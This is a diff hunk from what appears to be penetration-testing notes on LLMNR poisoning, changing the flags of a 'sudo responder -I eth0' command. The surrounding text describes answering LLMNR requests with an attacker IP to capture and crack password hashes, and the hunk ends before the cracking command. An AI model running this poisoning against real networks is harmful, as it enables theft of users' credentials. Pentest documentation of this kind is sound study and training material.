@@ -6,7 +6,7 @@ LLMNR is the successor to NetBIOS.  NetBIOS (Network Basic Input/Output System) 
 ## Exploitation [EASY]
 Listen for LLMNR requests and respond with our own attacker IP address, to redirect the traffic:
 ```bash
-sudo responder -I eth0 -dwPv
+sudo responder -I eth0 -dPv
 ```
 Once an event occurs, we can grab the hash and try to crack it using custom wordlists:
 ```bash
